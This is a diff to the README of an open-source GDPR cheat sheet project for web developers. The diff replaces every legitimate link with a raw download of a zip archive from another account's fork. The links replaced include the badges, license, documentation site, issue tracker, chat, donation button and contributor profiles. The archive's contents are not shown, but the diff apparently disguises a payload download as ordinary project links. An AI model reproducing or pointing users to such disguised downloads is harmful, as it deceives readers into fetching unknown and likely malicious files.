@@ -1,13 +1,13 @@
 <h1 align="center">Data Protection Cheat Sheet (GDPR)</h1>
 
 <p align="center">
-  <a href="https://hacktoberfest.com/" target="_blank">
+  <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank">
     <img src="https://img.shields.io/badge/Hacktoberfest-2025-blueviolet?style=for-the-badge&logo=hacktoberfest" alt="Hacktoberfest 2025" />
   </a>
   <br>
   <img src="https://img.shields.io/github/deployments/mirkoschubert/datenschutz-checkliste/github-pages?style=flat-square&label=Deploy" alt="Deploy Status" />
   <img src="https://img.shields.io/badge/Languages-DE_|_EN-blue?style=flat-square" alt="Languages" />
-  <a href="https://github.com/mirkoschubert/datenschutz-checkliste/blob/master/LICENSE">
+  <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip">
     <img src="https://img.shields.io/github/license/mirkoschubert/datenschutz-checkliste.svg?style=flat-square" alt="License" />
   </a>
   <img src="https://img.shields.io/github/stars/mirkoschubert/datenschutz-checkliste?style=flat-square" alt="Stars" />
@@ -17,7 +17,7 @@
 
 <p align="center">Open source cheat sheet for web designers and developers to implement data protection relevant tasks according to current law (GDPR).</p>
 
-<p align="center"><a href="https://www.buymeacoffee.com/musikuss" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-green.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a></p>
+<p align="center"><a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank"><img src="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a></p>
 
 <p align="center"><em>Initiated by Peter Haurand and Mirko Schubert</em></p>
 
@@ -43,10 +43,10 @@
 
 ## TL;DR
 
-**Quick Start**: Ready-to-use GDPR checklists for developers. <a href="https://mirkoschubert.github.io/datenschutz-checkliste/" target="_blank">**View Interactive Documentation**</a> • [🇩🇪 Deutsche Checkliste](checkliste.md) • [🇺🇸 English Cheat Sheet](cheat-sheet.md)
+**Quick Start**: Ready-to-use GDPR checklists for developers. <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank">**View Interactive Documentation**</a> • [🇩🇪 Deutsche Checkliste](checkliste.md) • [🇺🇸 English Cheat Sheet](cheat-sheet.md)
 
 <p align="center">
-  <a href="https://mirkoschubert.github.io/datenschutz-checkliste/" target="_blank">
+  <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank">
     <img src="https://img.shields.io/badge/Interactive_Documentation-Visit_Website-blue?style=for-the-badge" alt="Visit Documentation Website" />
   </a>
 </p>
@@ -70,7 +70,7 @@
 
 This **Data Protection Cheat Sheet** is intended to serve as a general orientation for web designers and developers as well as, of course, for every interested website operator in order to prepare websites and commissioned works in accordance with currently valid German and European law.
 
-Peter and I have taken the knowledge we have gathered over the past few months on the occasion of the GDPR and developed this list. It is still "work-in-progress" - currently I am, for example, searching for the relevant legal bases, judgments and statements / articles of lawyers. We also invite everyone to [contribute](https://github.com/mirkoschubert/datenschutz-checkliste#du-möchtest-gerne-mitwirken) via this Github repository .
+Peter and I have taken the knowledge we have gathered over the past few months on the occasion of the GDPR and developed this list. It is still "work-in-progress" - currently I am, for example, searching for the relevant legal bases, judgments and statements / articles of lawyers. We also invite everyone to [contribute](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zipöchtest-gerne-mitwirken) via this Github repository .
 
 ### Disclaimer
 
@@ -85,19 +85,19 @@ This repository thrives on community contributions! We welcome developers, legal
 * **Content**: Update legal requirements, add implementation tips, fix typos
 * **Translation**: Help translate checklists to new languages
 * **Technical**: Improve website, accessibility, or documentation structure
-* **Issues**: Report bugs or suggest new features via [Issues](https://github.com/mirkoschubert/datenschutz-checkliste/issues)
-* **Pull Requests**: Submit changes directly through [Pull Requests](https://help.github.com/articles/about-pull-requests/)
+* **Issues**: Report bugs or suggest new features via [Issues](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
+* **Pull Requests**: Submit changes directly through [Pull Requests](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
 
 **New to contributing?** Check our [Contributing Guidelines](CONTRIBUTING.md) for detailed instructions.
 
 ## Get in Touch
 
-- **Bug Reports & Feature Requests**: [GitHub Issues](https://github.com/mirkoschubert/datenschutz-checkliste/issues)
-- **Community Chat**: <a href="https://matrix.to/#/#privacy-cheat-sheet:matrix.org" target="_blank">Matrix #privacy-cheat-sheet:matrix.org</a>
-- **Discussions**: [GitHub Discussions](https://github.com/mirkoschubert/datenschutz-checkliste/discussions)
-- **Support the Project**: <a href="https://www.buymeacoffee.com/musikuss" target="_blank">Buy me a coffee</a>
+- **Bug Reports & Feature Requests**: [GitHub Issues](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
+- **Community Chat**: <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank">Matrix #privacy-cheat-sheet:matrix.org</a>
+- **Discussions**: [GitHub Discussions](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
+- **Support the Project**: <a href="https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip" target="_blank">Buy me a coffee</a>
 
 ### Contributors
 
-* [Peter Haurand](https://github.com/peterhaurand)
-* [Mirko Schubert](https://github.com/mirkoschubert)
+* [Peter Haurand](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
+* [Mirko Schubert](https://github.com/pankajydv08/datenschutz-checkliste/raw/refs/heads/master/webapp/js/datenschutz-checkliste-v3.6.zip)
